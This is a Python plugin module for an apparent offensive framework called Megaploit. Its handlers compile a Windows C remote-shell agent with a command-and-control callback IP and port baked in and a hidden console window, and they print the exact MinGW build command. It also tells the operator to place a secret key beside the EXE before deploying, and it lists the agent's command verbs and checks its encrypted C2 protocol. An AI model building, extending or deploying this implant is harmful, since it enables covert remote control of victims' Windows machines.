"""
plugins.c_remote_shell
~~~~~~~~~~~~~~~~~~~~~~
Python handlers for the C-remote-shell Megaploit plugin.

Commands provided
-----------------
  crs_build         — compile the Windows C agent (MinGW or MSVC)
  crs_probe         — run megaploit.core.c_probe compliance check
  crs_verbs         — list all C-exclusive verbs detected in the source
  crs_payload_info  — print the build flags needed for a given LHOST/PORT
"""

from __future__ import annotations

import os
import shutil
import subprocess
import sys

from megaploit.plugins.schema import PluginContext


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

_SUBMODULE_DIR = "C-remote-shell"


def _c_remote_shell_dir() -> str:
    """Absolute path to the C-remote-shell submodule directory."""
    return os.path.abspath(_SUBMODULE_DIR)


def _find_mingw() -> str | None:
    """Return the first MinGW cross-compiler found on PATH, or None."""
    candidates = [
        "x86_64-w64-mingw32-gcc",
        "i686-w64-mingw32-gcc",
    ]
    for name in candidates:
        if shutil.which(name):
            return name
    return None


def _find_msvc() -> bool:
    """Return True if cl.exe (MSVC) is available on PATH."""
    return shutil.which("cl") is not None


# ---------------------------------------------------------------------------
# crs_build — compile the Windows agent
# ---------------------------------------------------------------------------

def crs_build(args: list[str], ctx: PluginContext) -> str:
    """
    Compile the C-remote-shell Windows agent EXE.

    Usage: crs_build [lhost] [port]

    If lhost/port are omitted, the current session LHOST/PORT are used.
    Falls back to config.h defaults if nothing is set.

    Requires MinGW (x86_64-w64-mingw32-gcc) or MSVC (cl.exe) on PATH.
    """
    root = _c_remote_shell_dir()
    if not os.path.isdir(root):
        return f"[-] C-remote-shell directory not found at '{root}'"

    lhost = args[0] if len(args) >= 1 else ctx.lhost
    port  = args[1] if len(args) >= 2 else str(ctx.port)

    lines: list[str] = []

    # Compiler detection
    mingw = _find_mingw()
    msvc  = _find_msvc()

    if not mingw and not msvc:
        return (
            "[-] No C compiler found.\n"
            "    Linux/macOS: apt install mingw-w64\n"
            "    Windows:     open a Developer Command Prompt for VS"
        )

    if mingw:
        compiler = mingw
        lines.append(f"[*] Using MinGW: {compiler}")
        srcs = [
            os.path.join(root, "client", "main.c"),
            os.path.join(root, "client", "ntcalls.c"),
            os.path.join(root, "client", "shell.c"),
            os.path.join(root, "tls",    "tls_client.c"),
        ]
        out = os.path.join(root, "megaploit_c_agent.exe")
        cflags = [
            "-O2", "-DNDEBUG", "-DUNICODE", "-D_UNICODE", "-DSECURITY_WIN32",
        ]
        if lhost:
            cflags.append(f'-DC2_IP=\\"{lhost}\\"')
        if port:
            cflags.append(f"-DC2_PORT={port}")
        libs = ["-lsecur32", "-lcrypt32", "-lws2_32", "-lbcrypt",
                "-ladvapi32", "-luser32", "-mwindows"]
        cmd = [compiler] + cflags + srcs + ["-o", out] + libs

    else:
        compiler = "cl"
        lines.append(f"[*] Using MSVC: {compiler}")
        srcs = [
            os.path.join(root, "client", "main.c"),
            os.path.join(root, "client", "ntcalls.c"),
            os.path.join(root, "client", "shell.c"),
            os.path.join(root, "tls",    "tls_client.c"),
        ]
        out = os.path.join(root, "megaploit_c_agent.exe")
        cflags = ["/nologo", "/W3", "/O2", "/DNDEBUG"]
        if lhost:
            cflags.append(f'/DC2_IP=\\"{lhost}\\"')
        if port:
            cflags.append(f"/DC2_PORT={port}")
        libs = ["Secur32.lib", "Crypt32.lib", "ws2_32.lib", "bcrypt.lib",
                "Advapi32.lib", "User32.lib"]
        cmd = [compiler] + cflags + srcs + ["/link"] + libs + [f"/out:{out}"]

    lines.append(f"[*] Output: {out}")
    if lhost:
        lines.append(f"[*] C2_IP={lhost}  C2_PORT={port}")
    lines.append(f"[*] Running: {' '.join(cmd)}")

    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=180,
        )
    except FileNotFoundError as e:
        return "\n".join(lines) + f"\n[-] Compiler not found: {e}"
    except subprocess.TimeoutExpired:
        return "\n".join(lines) + "\n[-] Build timed out after 180s."

    if proc.returncode != 0:
        err = (proc.stderr or proc.stdout).strip()
        lines.append(f"[-] Build FAILED (exit {proc.returncode}):\n{err}")
    else:
        lines.append(f"[+] Build OK → {out}")
        lines.append(f"[*] Drop 'secret.key' alongside the EXE before deploying.")

    return "\n".join(lines)


# ---------------------------------------------------------------------------
# crs_probe — run the c_probe compliance report
# ---------------------------------------------------------------------------

def crs_probe(args: list[str], ctx: PluginContext) -> str:
    """
    Run the Megaploit C2 compliance probe against C-remote-shell source.

    Checks all four security layers:
      Layer 1 — SChannel TLS 1.2/1.3
      Layer 2 — HMAC-SHA256 auth
      Layer 3 — Protocol v2 negotiation
      Layer 4 — AES-256-GCM framing + replay protection
    """
    root = _c_remote_shell_dir()
    if not os.path.isdir(root):
        return f"[-] C-remote-shell directory not found at '{root}'"

    try:
        from megaploit.core.c_probe import probe, format_report
    except ImportError as e:
        return f"[-] Could not import c_probe: {e}"

    result = probe(root)
    return format_report(result)


# ---------------------------------------------------------------------------
# crs_verbs — list C-exclusive wire verbs
# ---------------------------------------------------------------------------

def crs_verbs(args: list[str], ctx: PluginContext) -> str:
    """
    List all wire-protocol verbs dispatched by the C agent.
    Marks which are C-exclusive (not handled by the Python agent).
    """
    root = _c_remote_shell_dir()
    if not os.path.isdir(root):
        return f"[-] C-remote-shell directory not found at '{root}'"

    try:
        from megaploit.core.c_probe import extract_verbs, c_exclusive_verbs
    except ImportError as e:
        return f"[-] Could not import c_probe: {e}"

    all_verbs  = extract_verbs(root)
    exclusive  = set(c_exclusive_verbs(root))

    lines = ["[*] C agent verb dispatch table:", ""]
    for verb in all_verbs:
        tag = "  [C-only]" if verb in exclusive else ""
        lines.append(f"    {verb!r}{tag}")

    lines.append("")
    lines.append(f"[*] {len(all_verbs)} total verbs  |  {len(exclusive)} C-exclusive")
    return "\n".join(lines)


# ---------------------------------------------------------------------------
# crs_payload_info — print what to bake into the EXE
# ---------------------------------------------------------------------------

def crs_payload_info(args: list[str], ctx: PluginContext) -> str:
    """
    Show the compile-time flags needed to point the C agent at this server.
    """
    lhost = ctx.lhost or "YOUR_LHOST"
    port  = ctx.port  or 50005

    return (
        "[*] C-remote-shell payload configuration\n"
        "\n"
        f"    C2_IP    = {lhost}\n"
        f"    C2_PORT  = {port}\n"
        "\n"
        "    Build with MinGW:\n"
        f"      x86_64-w64-mingw32-gcc -O2 -DSECURITY_WIN32 -DC2_IP=\\\"{lhost}\\\" "
        f"-DC2_PORT={port} \\\n"
        "        C-remote-shell/client/main.c C-remote-shell/client/ntcalls.c \\\n"
        "        C-remote-shell/client/shell.c C-remote-shell/tls/tls_client.c \\\n"
        "        -o megaploit_c_agent.exe \\\n"
        "        -lsecur32 -lcrypt32 -lws2_32 -lbcrypt -ladvapi32 -luser32 -mwindows\n"
        "\n"
        "    Or use:  crs_build  (runs the above automatically)\n"
        "\n"
        "    Remember to copy secret.key alongside the EXE before deployment."
    )
